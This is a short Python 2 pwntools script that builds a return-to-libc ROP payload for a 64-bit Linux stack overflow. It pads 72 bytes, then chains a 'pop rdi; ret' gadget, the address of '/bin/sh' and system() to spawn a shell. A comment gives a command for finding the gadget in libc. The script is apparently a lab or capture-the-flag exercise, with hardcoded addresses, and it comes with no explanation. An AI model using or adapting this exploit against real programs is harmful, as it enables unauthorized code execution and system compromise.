#!python

from pwn import *
context('amd64', 'linux', 'ipv4')

def getROP():
    # find: xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f | awk '{ printf"%x\n", $1-1}'
    # pop %rdi; retq
    PR = 0x7ffff7a341e8
    SYSTEM = 0x7ffff7a573d0 
    BINSH  = 0x7ffff7b944c3

    p = 'A' * 72
    p += p64(PR)
    p += p64(BINSH)
    p += p64(SYSTEM)

    return p

sc = getROP()
print sc
